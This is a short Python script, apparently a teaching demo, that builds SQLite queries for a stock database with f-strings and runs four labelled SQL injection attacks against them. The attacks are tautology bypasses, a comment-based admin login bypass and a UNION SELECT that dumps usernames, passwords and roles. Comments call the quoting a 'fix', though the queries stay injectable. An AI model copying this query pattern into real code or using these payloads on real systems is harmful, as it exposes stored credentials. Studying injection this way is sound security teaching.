import sqlite3

conn = sqlite3.connect('nyondo_stock.db')

def search_product(name):
    # Use double quotes around the f-string, single quotes inside SQL
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print(f"Query: {query}")
    rows = conn.execute(query).fetchall()
    print(f"Result: {rows}\n")
    return rows

def login(username, password):
    # Same fix: double quotes for Python string, single quotes for SQL
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"Query: {query}")
    row = conn.execute(query).fetchone()
    print(f"Result: {row}\n")
    return row

# --- Attacks ---
print("Attack 1")
search_product("' OR 1=1 -- ")

print("Attack 2")
login("admin' -- ", "anything")

print("Attack 3")
login("' OR '1'='1", "' OR '1'='1")

print("Attack 4")
search_product("' UNION SELECT id, username, password, role FROM users -- ")